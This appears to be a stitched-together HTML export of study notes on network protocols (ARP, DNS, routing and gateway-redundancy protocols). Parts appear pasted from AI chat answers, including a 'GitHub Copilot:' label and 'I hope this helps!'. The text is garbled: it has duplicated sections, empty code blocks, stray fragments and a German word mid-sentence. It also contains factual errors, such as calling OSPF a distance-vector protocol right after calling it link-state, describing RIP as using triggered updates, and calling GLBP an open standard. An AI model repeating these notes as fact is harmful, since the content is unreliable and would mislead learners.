<li><strong>Host A receives the response from Host B and stores the pair (Host B's IP address and MAC address) in its ARP cache.</strong></li>
<li><strong>Host A can now use the MAC address to directly communicate with Host B.</strong></li>
</ol>
<h3 id="key-features-of-arp"><a class="header" href="#key-features-of-arp">Key Features of ARP:</a></h3>
<ul>
<li><strong>Dynamic:</strong> ARP entries are created dynamically as needed. When a device needs to communicate with another device, it sends an ARP request and stores the response in its cache.</li>
<li><strong>Cached:</strong> ARP maintains a cache of recently used IP-to-MAC address mappings. This cache improves efficiency by avoiding sending unnecessary ARP requests for devices already encountered.</li>
<li><strong>Limited Scope:</strong> ARP operates only within a single network segment. If communication needs to occur across different network segments, additional routing protocols are required.</li>
</ul>
<h3 id="arp-packet-structure"><a class="header" href="#arp-packet-structure">ARP Packet Structure:</a></h3>
<p>An ARP packet consists of two parts:</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">DNS</a></h1>
<p>The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or other resources connected to the internet or a private network. It associates various information with domain names assigned to each of the associated entities. Most prominently, it translates domain names meaningful to humans into the numerical IP addresses needed for locating and identifying computer devices and services with the underlying network protocols. By providing a worldwide, distributed directory service, the Domain Name System has been an essential component of the functionality of the Internet since 1985.</p>
<p>The Domain Name System (DNS) has two main functions:</p>
<ol>
<li><strong>Translating domain names into IP addresses:</strong> When you type a domain name into your web browser, DNS is responsible for translating that domain name into the IP address of the web server that hosts the website.</li>
<li><strong>Mapping other information to domain names:</strong> DNS can also be used to map other information to domain names, such as email addresses and MX records.</li>
</ol>
<p>DNS is a distributed system, meaning that there is no single central DNS server. Instead, there are many different DNS servers around the world, each of which is responsible for a different subset of domain names.</p>
<p>When you type a domain name into your web browser, your computer will first query a local DNS server. If the local DNS server does not have the answer, it will query another DNS server, and so on. This process continues until a DNS server is found that has the answer to the query.</p>
<p>Once the DNS server has the answer to the query, it will return the IP address of the web server to your computer. Your computer can then use the IP address to connect to the web server and download the website.</p>
<p>DNS is a critical part of the internet infrastructure. Without DNS, it would be impossible to access websites and other online resources using domain names.</p>
<p>Here is an example of how DNS works:</p>
<ol>
<li>You type <code>google.com</code> into your web browser.</li>
<li>Your computer queries a local DNS server for the IP address of <code>google.com</code>.</li>
<li>The local DNS server does not have the answer to the query, so it queries another DNS server.</li>
<li>This process continues until a DNS server is found that has the answer to the query.</li>
<li>The DNS server returns the IP address of <code>google.com</code> to your computer.</li>
<li>Your computer uses the IP address to connect to the Google web server and download the Google homepage.</li>
</ol>
<p>DNS stands for Domain Name System. It is a hierarchical and distributed naming system used to translate human-friendly domain names, such as &quot;www.example.com,&quot; into IP (Internet Protocol) addresses, which computers use to identify each other on the network. In essence, DNS is like the &quot;phonebook&quot; of the internet, allowing users to access websites and other resources using domain names instead of having to remember complex IP addresses.</p>
<p>Here are some key points about DNS:</p>
<ol>
<li>
<p><strong>Translation of Domain Names to IP Addresses:</strong> DNS is responsible for mapping domain names (like example.com) to IP addresses (like 192.168.1.1). This process is known as DNS resolution.</p>
</li>
<li>
<p><strong>Hierarchical Structure:</strong> DNS is organized hierarchically, with the root domain at the top, followed by top-level domains (TLDs), second-level domains, and so on. For example, in the domain name &quot;www.example.com,&quot; &quot;com&quot; is the top-level domain, &quot;example&quot; is the second-level domain, and &quot;www&quot; is a subdomain.</p>
</li>
<li>
<p><strong>DNS Servers:</strong> The DNS system consists of many DNS servers distributed worldwide. These servers store information about domain names and their corresponding IP addresses. The system is designed for redundancy and fault tolerance.</p>
</li>
<li>
<p><strong>Recursive and Authoritative Servers:</strong> DNS queries involve two main types of servers: recursive resolvers and authoritative servers. Recursive resolvers are typically operated by internet service providers or DNS service providers and help users find the IP address for a domain. Authoritative servers store and provide DNS records for specific domains.</p>
</li>
<li>
<p><strong>DNS Records:</strong> DNS records are used to store various types of information about a domain, including A records (for IPv4 addresses), AAAA records (for IPv6 addresses), MX records (for mail servers), CNAME records (for aliases), and more.</p>
</li>
<li>
<p><strong>Caching:</strong> To improve efficiency, DNS servers often cache resolved DNS records for a period of time. This reduces the need to repeatedly query authoritative servers for the same information.</p>
</li>
</ol>
<p>DNS is a fundamental component of the internet infrastructure, enabling users to access websites, send emails, and connect to various online services using user-friendly domain names. It plays a crucial role in the functioning of the internet and is essential for browsing the web and many other internet-related activities.</p>
<p>Here's a table describing each of the DNS record types you mentioned:</p>

</ul>
<p>These are just some of the most common DNS records. There are many other types of DNS records that can be used for a variety of purposes.</p>
<p>I hope this helps!</p>
<p>A DNS zone is a portion of the Domain Name System (DNS) namespace that is managed by a specific organization or administrator. DNS zones are used to organize DNS records, which are the mappings between domain names and IP addresses.</p>
<p>DNS zones are typically organized by domain name, with each zone containing the records for a specific domain and its subdomains. For example, the DNS zone for the domain <code>example.com</code> would contain the records for the domain <code>example.com</code> and its subdomains, such as <code>www.example.com</code> and <code>mail.example.com</code>.</p>
<p>DNS zones are also used to control access to DNS records. Each DNS zone has a set of permissions that control who can create, update, and delete records in the zone.</p>
<p>Here are some examples of DNS zones:</p>
<ul>
<li>The DNS zone for the root domain (<code>.</code>) is managed by the Internet Assigned Numbers Authority (IANA).</li>
<li>The DNS zone for the <code>.com</code> domain is managed by Verisign.</li>
<li>The DNS zone for the <code>.org</code> domain is managed by the Public Interest Registry (PIR).</li>
<li>The DNS zone for the <code>.gov</code> domain is managed by the General Services Administration (GSA).</li>
<li>The DNS zone for the <code>.edu</code> domain is managed by the EDUCAUSE.</li>
</ul>
<p>Organizations can also create their own DNS zones to manage their own domain names. For example, a company might create a DNS zone for its domain name <code>example.com</code>.</p>
<p>DNS zones are an important part of the DNS infrastructure. They allow DNS administrators to organize and manage DNS records, and to control access to those records.</p>
<p>Here is an example of how DNS zones can be used to manage DNS records:</p>
<p>A company has a domain name <code>example.com</code>. The company wants to create a new website, so it creates a subdomain called <code>www.example.com</code>. The company also wants to create a new email server, so it creates a subdomain called <code>mail.example.com</code>.</p>
<p>The company creates a DNS zone for each of the subdomains. The DNS zone for <code>www.example.com</code> contains the record that maps the domain name <code>www.example.com</code> to the IP address of the web server. The DNS zone for <code>mail.example.com</code> contains the record that maps the domain name <code>mail.example.com</code> to the IP address of the email server.</p>
<p>The company's DNS server then responds to queries for the domain names <code>www.example.com</code> and <code>mail.example.com</code> by returning the corresponding IP addresses. This allows users to access the company's website and email server by typing the domain names into their web browser or email client.</p>
<p>DNS zones are a powerful tool for managing DNS records. By using DNS zones, organizations can improve the performance, reliability, and security of their DNS infrastructure.</p>
<p>DNS (Domain Name System) zones are a fundamental concept in DNS that define administrative boundaries within the DNS namespace. A DNS zone is a portion of a domain for which a particular organization, entity, or individual is responsible. It includes the authoritative DNS records for the domain and its subdomains. Zones help in the management and delegation of DNS information within the DNS hierarchy.</p>
<p>Each DNS zone typically consists of the following components:</p>
<ol>
<li>
<p><strong>Zone Name</strong>: The name of the zone, which is usually the domain for which it is responsible. For example, if you own the domain &quot;example.com,&quot; then your DNS zone name would be &quot;example.com.&quot;</p>
</li>
<li>
<p><strong>Zone File</strong>: The zone file contains the DNS resource records (RRs) associated with the domain and its subdomains. These records include A records (for IPv4 addresses), AAAA records (for IPv6 addresses), MX records (for mail servers), CNAME records (for aliasing), and more.</p>
</li>
<li>
<p><strong>Authoritative DNS Servers</strong>: A DNS zone is typically hosted on one or more authoritative DNS servers. These servers are responsible for responding to DNS queries for the zone's domain and subdomains. For redundancy and load balancing, multiple authoritative servers may be used, and they should all have the same zone data.</p>
</li>
<li>
<p><strong>SOA Record (Start of Authority)</strong>: The SOA record is the first record in a zone file and contains administrative information about the zone, such as the primary authoritative server for the zone, the email address of the zone administrator, and timing parameters for zone transfers and caching.</p>
</li>
</ol>
<p>Here's an example of a DNS zone for the domain &quot;example.com&quot;:</p>
<pre><code class="language-plaintext">$ORIGIN example.com.

</code></pre>
<p>In this example:</p>
<ul>
<li>&quot;example.com&quot; is the zone name.</li>
<li>The zone file contains SOA, NS, and A records. The SOA record specifies the primary authoritative server (ns1.example.com) and administrative information. NS records indicate the authoritative name servers for the zone. A records associate IP addresses with the domain and its subdomains.</li>
<li>The &quot;@&quot; symbol represents the zone's apex (example.com), and subdomains like &quot;www&quot; and &quot;mail&quot; are specified explicitly.</li>
</ul>
<p>DNS zones are essential for efficient management and delegation of DNS information. They allow different organizations or entities to have control over their respective domains while still being part of the larger DNS system. Properly configured DNS zones ensure that DNS queries for a domain and its subdomains are resolved accurately and efficiently.</p>
<p>GitHub Copilot: DNS Zones are a portion of the domain name space in the Domain Name System (DNS) for which administrative responsibility has been delegated. A DNS zone can contain one or more contiguous domains. A DNS server can be authoritative for multiple DNS zones.</p>
<p>There are two types of DNS zones:</p>
<ol>
<li>
<p><strong>Primary Zone</strong>: This is the main zone where the data is stored in a file on the server. Changes to the DNS records should be done in this zone. The file is stored as text, which makes it easy to edit manually if necessary.</p>
</li>
<li>
<p><strong>Secondary Zone</strong>: This is a read-only copy of the primary zone. It's used for load balancing and to ensure the DNS system continues to function if the primary server fails. The data in a secondary zone is periodically updated from the primary zone.</p>
</li>
</ol>
<p>Here's an example to illustrate DNS zones:</p>
<p>Let's say you own the domain <code>example.com</code>. The DNS zone for <code>example.com</code> would include the DNS records for <code>example.com</code> and any subdomains, like <code>www.example.com</code> or <code>mail.example.com</code>.</p>
<p>The DNS records might look something like this:</p>
<ul>
<li><code>example.com. A 192.0.2.1</code></li>
<li><code>www.example.com. CNAME example.com.</code></li>
<li><code>mail.example.com. A 192.0.2.2</code></li>
</ul>
<p>In this example, <code>example.com</code> is an A record that points to the IP address <code>192.0.2.1</code>, <code>www.example.com</code> is a CNAME record that points to <code>example.com</code>, and <code>mail.example.com</code> is an A record that points to the IP address <code>192.0.2.2</code>.</p>
<p>These records are all part of the DNS zone for <code>example.com</code>. If you were to delegate the subdomain <code>blog.example.com</code> to another DNS server, that server would have a separate DNS zone for <code>blog.example.com</code>.</p>
<p>DNS Security refers to the measures taken to protect the Domain Name System (DNS) from cyber threats. The DNS is a critical part of the internet infrastructure, as it translates human-readable domain names into IP addresses that machines can understand. If the DNS is compromised, it can lead to serious security issues like DNS spoofing or cache poisoning, where an attacker redirects queries to a malicious site.</p>
<p>Here are some key aspects of DNS Security:</p>
<ol>
<li>
<p><strong>DNSSEC (DNS Security Extensions)</strong>: This is a suite of Internet Engineering Task Force (IETF) specifications for securing certain kinds of information provided by the DNS. It provides DNS resolvers with origin authentication of DNS data, authenticated denial of existence, and data integrity, but not availability or confidentiality.</p>
</li>
<li>
<p><strong>DNS over HTTPS (DoH)</strong>: This protocol sends DNS queries over an encrypted HTTPS connection, protecting the data from eavesdroppers and preventing potential attacks.</p>
</li>
<li>
<p><strong>DNS over TLS (DoT)</strong>: Similar to DoH, DoT also encrypts DNS queries but uses the TLS protocol for encryption.</p>
</li>
<li>
<p><strong>DNS Firewall</strong>: This is a security solution that uses threat intelligence to block DNS queries going out to malicious or unwanted domains.</p>
</li>
<li>
<p><strong>DNS Filtering</strong>: This involves blocking access to certain websites based on the website's IP address. This can be used to prevent access to malicious or inappropriate websites.</p>
</li>
<li>
<p><strong>Rate Limiting</strong>: This involves limiting the number of DNS queries that can be made from a single IP address in a certain period of time. This can help to prevent DDoS attacks.</p>
</li>
<li>
<p><strong>Monitoring and Logging</strong>: Keeping track of DNS queries and maintaining logs can help to identify suspicious activity and potential security threats.</p>
</li>
</ol>
<p>Implementing these measures can significantly enhance the security of the DNS and protect against a variety of cyber threats. However, it's important to note that each of these measures has its own strengths and weaknesses, and the best approach depends on the specific requirements and threat model of the network.</p>
<p>DNS security is a practice of protecting DNS infrastructure from cyber attacks in order to keep it performing quickly and reliably.

</ul>
<p>Overall, DNS security is an important part of any cybersecurity strategy. By implementing DNS security measures, organizations can protect their networks and users from DNS attacks.</p>
<p>DNS (Domain Name System) security refers to a set of measures and protocols designed to protect the DNS infrastructure and the data it manages from various types of threats and vulnerabilities. DNS is a fundamental component of the internet that translates human-readable domain names (like www.example.com) into IP addresses (like 192.0.2.1) that computers use to locate each other on the internet. Ensuring the security of the DNS is crucial because it plays a significant role in internet security, and any compromise of the DNS can lead to various cyberattacks.</p>
<p>Here are some key aspects of DNS security:</p>
<ol>
<li>
<p>DNSSEC (Domain Name System Security Extensions): DNSSEC is a set of extensions to DNS that adds cryptographic security to the system. It uses digital signatures to ensure the authenticity and integrity of DNS data. This helps prevent DNS cache poisoning, where malicious data is injected into DNS caches to redirect users to fraudulent websites.</p>
</li>
<li>
<p>DDoS Mitigation: Distributed Denial of Service (DDoS) attacks can target DNS infrastructure, overwhelming it with a massive amount of traffic and rendering it inaccessible. DNS security solutions include DDoS mitigation techniques to protect against such attacks.</p>
</li>

<h2 id="dns-system-weakness"><a class="header" href="#dns-system-weakness">DNS system weakness.</a></h2>
<p>If most of the DNS servers on the web start to propagate false DNS data, most other DNS servers will pick it up at some point, cutting out the world from the world wide web, leaving only IP website host resolutions enabled. This is called a DNS hijacking attack. It is a type of attack where an attacker takes control of a domain name server (DNS) and changes the IP address associated with a domain name. This allows the attacker to redirect users to a malicious website or to intercept their communications.</p>
<h2 id="the-domain-name-system-dns-network-protocol"><a class="header" href="#the-domain-name-system-dns-network-protocol">The Domain Name System (DNS) Network Protocol</a></h2>
<p>The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, or any resource connected to the internet or a private network. It associates various information with domain names assigned to each of the participating entities. Most prominently, it translates human-readable domain names (example.com) into the numerical identifiers used by network services (e.g. IP addresses). This process, called DNS resolution, is the foundation of various internet features, including email, web browsing, and instant messaging.</p>
<h3 id="functionality"><a class="header" href="#functionality">Functionality:</a></h3>
<ol>
<li><strong>Mapping domain names to IP addresses (DNS resolution):</strong> This allows users to remember and type meaningful names like &quot;google.com&quot; instead of having to memorize and type IP addresses like &quot;172.217.7.142.&quot;</li>
<li><strong>Translating various types of information:</strong> DNS translates domain names to other information besides IP addresses, such as mail server addresses or service location information for load balancing.</li>
<li><strong>Hierarchical and decentralized structure:</strong> The domain name space consists of a tree of zones administered by different entities. This allows for distributed and scalable management of domain names and information associated with them.</li>
<li><strong>Caching mechanisms:</strong> To improve performance and reduce load on authoritative name servers, DNS relies on caching mechanisms at various points in the network, including recursive and authoritative nameservers.</li>
</ol>
<h3 id="protocol-details"><a class="header" href="#protocol-details">Protocol Details:</a></h3>
<ul>
<li><strong>UDP as the primary transport layer protocol:</strong> DNS primarily uses User Datagram Protocol (UDP) for communication between clients and servers due to its lower overhead compared to TCP.</li>
<li><strong>TCP for larger transactions or reliability needs:</strong> TCP may be used for specific transactions like zone transfers or when reliability is critical.</li>
<li><strong>DNS message format:</strong> Information is exchanged in DNS messages, composed of five sections: Header, Question, Answer, Authority, and Additional. Each section performs specific roles in resolving domain names.</li>
<li><strong>DNS resource records:</strong> Actual data is stored in various types of resource records (RRs), which associate specific information with a given domain name.</li>
</ul>
<h3 id="additional-considerations"><a class="header" href="#additional-considerations">Additional Considerations:</a></h3>
<ul>
<li><strong>DNS security concerns:</strong> DNS is susceptible to various security threats like spoofing, hijacking, and amplification attacks. Security mechanisms like DNSSEC (Domain Name System Security Extensions) are used to mitigate these threats.</li>
<li><strong>DNS extensions and emerging trends:</strong> DNS is evolving with the growth of the internet, incorporating new features and protocols like DNS over HTTPS (DoH) to improve privacy and security.</li>

<h3 id="how-ntp-works"><a class="header" href="#how-ntp-works">How NTP Works</a></h3>
<p>NTP uses a hierarchical architecture with three types of servers:</p>
<ul>
<li><strong>Stratum 0 (reference clocks):</strong> These are highly accurate, stand-alone time sources, such as atomic clocks or GPS receivers. network-protocols network-protocols-filenames-with-links <strong>Stratum 1 (primary servers):</strong> These are usually servers that are directly connected to a stratum 0 clock and provide time information to other servers in the network.</li>
<li><strong>Stratum 2, 3, and higher (secondary servers):</strong> These are servers that obtain their time information from a server of a higher stratum.</li>
</ul>
<p>When a computer wants to synchronize its clock, it sends a request to an NTP server. The server sends back the current time, as well as information about the server's own clock accuracy and the time it took for the request to reach the server and for the response to be sent back.</p>
<p>The computer then calculates the offset between its own clock and the server's clock, taking into account the network delay. The computer then adjusts its clock to be closer to the server's clock.</p>

<h2 id="rip-network-protocol-a-detailed-overview"><a class="header" href="#rip-network-protocol-a-detailed-overview">RIP Network Protocol: A Detailed Overview</a></h2>
<p>RIP (Routing Information Protocol) is a distance-vector routing protocol primarily used in small, private networks. It's considered a legacy protocol as it was introduced in 1988 and has been superseded by more advanced protocols like OSPF and BGP in large, complex networks. However, RIP remains relevant in specific situations due to its simplicity and low resource requirements.</p>
<h3 id="key-features-of-rip"><a class="header" href="#key-features-of-rip">Key Features of RIP:</a></h3>
<ul>
<li><strong>Distance-Vector Protocol:</strong> RIP calculates the shortest path to a destination based on the hop count, where each hop represents a router on the path. The maximum hop count is 15, and exceeding this limit indicates an unreachable destination.</li>
<li><strong>Classful Routing:</strong> RIP uses classful routing, meaning it doesn't recognize variable-length subnet masks. This limits its scalability in networks with complex subnet structures.</li>
<li><strong>Bellman-Ford Algorithm:</strong> RIP employs the Bellman-Ford algorithm to calculate the shortest path. This algorithm iteratively updates routing tables with the best paths available, considering hop count as the metric.</li>
<li><strong>Triggered Updates:</strong> RIP sends out routing updates only when changes occur in the network, minimizing bandwidth consumption compared to periodic updates.</li>
<li><strong>Limited Scalability:</strong> Due to its simplicity and hop count limitations, RIP is not suitable for large, complex networks with multiple paths and diverse topologies.</li>
<li><strong>Vulnerable to Routing Loops:</strong> As a distance-vector protocol, RIP can be vulnerable to routing loops, particularly in networks with redundant paths.</li>
</ul>
<h3 id="rip-versions"><a class="header" href="#rip-versions">RIP Versions:</a></h3>
<ul>
<li><strong>RIPv1:</strong> The initial version of RIP, using classful routing and broadcast updates.</li>
<li><strong>RIPv2:</strong> This version introduced support for variable-length subnet masks and authentication, addressing some limitations of RIPv1. It also offered multicast updates, reducing broadcast traffic.</li>
<li><strong>RIPng:</strong> Designed for IPv6 networks, providing equivalent functionality to RIPv2 but adapted to the IPv6 address structure.</li>
</ul>
<h3 id="applications-of-rip"><a class="header" href="#applications-of-rip">Applications of RIP:</a></h3>
<ul>
<li><strong>Small, Private Networks:</strong> RIP's simplicity and low overhead make it suitable for small, private networks with manageable topologies.</li>
<li><strong>Cost-Effective Solution:</strong> In contexts where complexity is limited, RIP offers a cost-effective routing solution compared to more sophisticated protocols.</li>
<li><strong>Backup Routing Protocol:</strong> RIP can serve as a backup routing protocol in larger networks, providing redundancy in case of primary protocol failures.</li>
</ul>
<h3 id="limitations-of-rip"><a class="header" href="#limitations-of-rip">Limitations of RIP:</a></h3>
<ul>
<li><strong>Limited Scalability:</strong> RIP's hop count limitation and lack of support for complex routing scenarios restrict its application in large, intricate networks.</li>
<li><strong>Slow Convergence:</strong> RIP's reliance on periodic updates can lead to slower convergence compared to protocols like OSPF, which employ faster triggered updates.</li>
<li><strong>Susceptibility to Routing Loops:</strong> The distance-vector nature of RIP makes it vulnerable to routing loops in networks with redundant paths.</li>
<li><strong>Vulnerable to Security Attacks:</strong> RIP's lack of strong authentication mechanisms makes it susceptible to security attacks like route poisoning.</li>
</ul>
<p>Overall, RIP remains a relevant option for specific situations where its simplicity and low resource requirements are advantageous. However, for large, complex networks with diverse routing needs, more advanced protocols like OSPF and BGP offer superior scalability, security, and performance.</p>

<h2 id="ospf-network-protocol-a-deep-dive"><a class="header" href="#ospf-network-protocol-a-deep-dive">OSPF Network Protocol: A Deep Dive</a></h2>
<p><strong>OSPF (Open Shortest Path First)</strong> is a routing protocol that uses the <strong>link-state algorithm</strong> to calculate the shortest path between any two nodes in a network. It is a <strong>distance-vector routing protocol</strong>, which means that it uses vector-based routing information to determine the best path to a destination. OSPF is an <strong>interior gateway protocol (IGP)</strong>, which means that it is used within a single autonomous system (AS).</p>
<h3 id="key-features-of-ospf"><a class="header" href="#key-features-of-ospf">Key Features of OSPF:</a></h3>
<ul>
<li><strong>Link-state routing:</strong> OSPF uses the link-state algorithm to create a map of the entire network. This map is then used to calculate the shortest path between any two nodes.</li>
<li><strong>Hierarchical addressing:</strong> OSPF uses hierarchical addressing to divide the network into areas. This allows for faster routing updates and reduces the amount of routing information that needs to be propagated throughout the network.</li>
<li><strong>Stubby areas:</strong> OSPF stubby areas are areas that do not allow for the advertisement of external routes. This is useful for areas that do not need to know about the entire network topology.</li>
<li><strong>Virtual Links:</strong> OSPF virtual links are used to connect two areas that are not directly connected. This allows for the routing of traffic between the two areas.</li>
<li><strong>MD5 authentication:</strong> OSPF supports MD5 authentication to prevent unauthorized routing updates from being accepted.</li>
</ul>
<h3 id="how-ospf-works"><a class="header" href="#how-ospf-works">How OSPF Works:</a></h3>
<ol>
<li><strong>Router discovery:</strong> Each router running OSPF discovers its neighboring routers.</li>
<li><strong>Link-state advertisement:</strong> Each router sends a link-state advertisement (LSA) to its neighbors. An LSA contains information about the router's interfaces, including the network address, subnet mask, and cost.</li>
<li><strong>Link-state database creation:</strong> Each router creates a link-state database (LSDB) that contains the LSAs received from its neighbors.</li>
<li><strong>Shortest path calculation:</strong> Each router uses the Dijkstra algorithm to calculate the shortest path to each destination in the network.</li>
<li><strong>Routing table creation:</strong> Each router creates a routing table based on the shortest path calculations.</li>
</ol>
<h3 id="advantages-of-ospf"><a class="header" href="#advantages-of-ospf">Advantages of OSPF:</a></h3>

<h2 id="what-is-the-bgp-network-protocol"><a class="header" href="#what-is-the-bgp-network-protocol">What is the BGP Network Protocol?</a></h2>
<p>BGP, which stands for Border Gateway Protocol, is the <strong>routing protocol of the internet</strong>. It is responsible for exchanging routing information between autonomous systems (AS), which are large networks owned by ISPs, corporations, or other organizations. BGP enables these networks to connect and communicate with each other, ensuring data packets are delivered across the global internet.</p>
<h3 id="key-features-of-bgp"><a class="header" href="#key-features-of-bgp">Key Features of BGP:</a></h3>
<ul>
<li><strong>Path Vector Protocol:</strong> Rather than simply sharing the next hop, BGP transmits the entire path a packet has taken to reach a destination. This allows for better routing decisions and optimization.</li>
<li><strong>External Gateway Protocol:</strong> BGP primarily operates between different ASs and is external to each individual network.</li>
<li><strong>Policy-based Routing:</strong> BGP allows administrators to configure policies to control how internet traffic flows, including load balancing and traffic engineering.</li>
<li><strong>Inter-domain Routing:</strong> BGP is crucial for inter-domain routing, enabling communication between networks owned by different entities.</li>
</ul>
<h3 id="how-bgp-works"><a class="header" href="#how-bgp-works">How BGP Works:</a></h3>
<p>BGP operates on a <strong>peer-to-peer basis</strong>, where routers from different ASs exchange routing information. This exchange happens through TCP connections, ensuring reliable data transfer.</p>
<p>BGP routing updates contain information about:</p>
<ul>
<li>Network prefixes (destinations) and their associated paths</li>
<li>Path attributes, including AS path, next hop, and local preference</li>
<li>Administrative information, such as community and origin AS</li>
</ul>
<p>Routers analyze these updates and update their routing tables accordingly, choosing the best path to reach each destination based on configured policies and attributes.</p>
<h3 id="bgp-versions"><a class="header" href="#bgp-versions">BGP Versions:</a></h3>
<p>There are two main versions of BGP:</p>
<ul>

<h2 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h2>
<p>VRRP, or Virtual Router Redundancy Protocol, is a crucial protocol for ensuring network availability and fault tolerance. It allows multiple routers to form a virtual router, with one acting as the master and others as backups. If the master fails, a backup seamlessly takes over, minimizing downtime and disruption.</p>
<h2 id="vrrp-operation"><a class="header" href="#vrrp-operation">VRRP Operation</a></h2>
<p>At its core, VRRP operates through the following key points:</p>
<p><strong>Virtual Router:</strong> Each router participating in VRRP belongs to a virtual router identified by a unique virtual router ID (VRID).</p>
<p><strong>Master Election:</strong> The routers exchange VRRP advertisements, electing the one with the highest priority as the master. If priorities are equal, the router with the highest IP address wins.</p>
<p><strong>State Transitions:</strong></p>
<ul>
<li><strong>Master:</strong> The active router responsible for forwarding traffic.</li>
<li><strong>Backup:</strong> Monitors the master and takes over if it fails.</li>
<li><strong>Initializing:</strong> Starts participating in the VRRP election.</li>
<li><strong>Backup (Secondary):</strong> Loses the election and becomes a backup.</li>
</ul>
<p><strong>Advertisement Messages:</strong></p>
<ul>
<li><strong>Multicast:</strong> Sent to a specific VRRP multicast address within the local network.</li>
<li><strong>Unicast:</strong> Optionally configured for point-to-point communication between specific routers.</li>
</ul>
<p><strong>Failover:</strong></p>
<ul>
<li><strong>Master Failure:</strong> If the master fails, a backup detects the absence of advertisements and transitions to the Master state, taking over traffic forwarding.</li>
<li><strong>Preemption:</strong> A higher-priority backup can preempt a lower-priority master, ensuring the most capable router takes control.</li>
</ul>
<h2 id="benefits-of-vrrp"><a class="header" href="#benefits-of-vrrp">Benefits of VRRP</a></h2>
<ul>
<li><strong>High Availability:</strong> Provides redundancy, minimizing downtime during router failures.</li>
<li><strong>Load Balancing:</strong> Distributes traffic across multiple routers, improving network performance.</li>
<li><strong>Scalability:</strong> Easily adds or removes routers from the virtual router without disrupting the network.</li>
<li><strong>Flexibility:</strong> Supports various network configurations and topologies.</li>
</ul>
<h2 id="vrrp-versions"><a class="header" href="#vrrp-versions">VRRP Versions</a></h2>
<ul>
<li><strong>VRRPv2:</strong> The most common version, offering basic functionality.</li>
<li><strong>VRRPv3:</strong> Introduces authentication and preemption for enhanced security and control.</li>
<li><strong>VRRP-E:</strong> An extension for Ethernet networks, providing additional features like load balancing.</li>
</ul>
<h2 id="example-configuration"><a class="header" href="#example-configuration">Example Configuration</a></h2>
<p>Here's a basic VRRP configuration on two Cisco routers:</p>
<pre><code>! Router 1
interface GigabitEthernet0/0
ip address 192.168.1.1 255.255.255.0
vrrp 10 ip 192.168.1.100 priority 100
!
! Router 2
interface GigabitEthernet0/0
ip address 192.168.1.2 255.255.255.0
vrrp 10 ip 192.168.1.100 priority 50
</code></pre>
<p>This configuration creates a VRRP group with VRID 10, using IP address 192.168.1.100. Router 1 becomes the master due to its higher priority.</p>
<h2 id="conclusion-9"><a class="header" href="#conclusion-9">Conclusion</a></h2>
<p>VRRP plays a vital role in modern networks, ensuring continuous operation and minimizing disruptions. Its flexibility and ease of deployment make it a valuable tool for network administrators. For further details, consult the official VRRP RFCs and specific vendor documentation.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hsrp-network-protocol"><a class="header" href="#hsrp-network-protocol">HSRP Network Protocol</a></h1>
<h2 id="hot-standby-router-protocol-hsrp"><a class="header" href="#hot-standby-router-protocol-hsrp">Hot Standby Router Protocol (HSRP)</a></h2>
<p>HSRP is a Cisco proprietary protocol used to create fault-tolerant routing environments on a Local Area Network (LAN). It eliminates the single point of failure by dynamically assigning a virtual router IP address and MAC address to one of the active routers in the group. This virtual router, known as the <strong>HSRP active router</strong>, forwards data packets on behalf of all routers in the network.</p>
<h3 id="key-features-of-hsrp"><a class="header" href="#key-features-of-hsrp">Key Features of HSRP:</a></h3>
<ul>
<li><strong>Provides redundancy:</strong> If the active router fails, another router in the group immediately takes over, minimizing downtime.</li>
<li><strong>Eliminates single point of failure:</strong> By distributing the virtual router across multiple physical routers, HSRP ensures continued network operation even if a router fails.</li>
<li><strong>Dynamically elects active router:</strong> Based on the configured priority, HSRP automatically elects the router with the highest priority as the active router.</li>
<li><strong>Load balancing:</strong> HSRP can be configured to distribute traffic across multiple active routers, improving network performance.</li>
<li><strong>Supports preemption:</strong> Allows a higher-priority standby router to preempt the active router if it fails.</li>
<li><strong>Easy to configure and manage:</strong> Compared to other redundancy protocols, HSRP is relatively simple to configure and manage.</li>
</ul>
<h3 id="how-hsrp-works"><a class="header" href="#how-hsrp-works">How HSRP Works</a></h3>
<ol>
<li><strong>Routers are configured as HSRP groups:</strong> Each router is assigned a group number and a unique IP address within that group.</li>
<li><strong>Priority is assigned:</strong> A priority value is assigned to each router, with higher values indicating higher preference to become the active router.</li>
<li><strong>Election process:</strong> The router with the highest priority becomes the <strong>active router</strong> and übernimmt the virtual router IP and MAC address. The remaining routers become <strong>standby routers</strong>.</li>
<li><strong>Hello messages:</strong> Active routers send out Hello messages periodically to advertise their availability. Standby routers monitor these messages and update their state accordingly.</li>
<li><strong>Failure detection:</strong> If the standby router doesn't receive Hello messages from the active router within a specific timeframe, it triggers a new election process to choose a new active router.</li>
</ol>
<h3 id="hsrp-applications"><a class="header" href="#hsrp-applications">HSRP Applications</a></h3>
<p>HSRP is mainly used in scenarios where high availability and redundancy are crucial for critical network services:</p>

<p>The Gateway Load Balancing Protocol (GLBP) is a Layer 3 routing protocol used to distribute network traffic across multiple gateways, providing fault tolerance and load balancing for mission-critical applications. Unlike other routing protocols like HSRP or VRRP, GLBP focuses solely on network-layer forwarding, making it ideal for scenarios where Layer 2 redundancy isn't needed. </p>
<p>Here's a detailed breakdown of the GLBP protocol:</p>
<p><strong>Key Features:</strong></p>
<ul>
<li><strong>Load Balancing:</strong> GLBP distributes traffic across available gateways based on configurable weights and algorithms, optimizing network performance.</li>
<li><strong>Fault Tolerance:</strong> In case of a gateway failure, GLBP reroutes traffic to the remaining operational gateways seamlessly, ensuring service continuity.</li>
<li><strong>Fast Failover:</strong> GLBP employs rapid detection mechanisms and fast convergence times for failover, minimizing service disruption.</li>
<li><strong>Simplicity:</strong> GLBP operates at Layer 3, simplifying configuration and troubleshooting compared to Layer 2 protocols.</li>
<li><strong>Scalability:</strong> GLBP supports large networks with numerous gateways and diverse routing scenarios.</li>
<li><strong>Flexibility:</strong> GLBP allows for customization through various parameters, including routing table manipulation and load balancing algorithms.</li>
<li><strong>Open Standard:</strong> GLBP is an open standard, enabling interoperability between devices from different vendors.</li>
</ul>
<p><strong>Technical Details:</strong></p>
<ul>
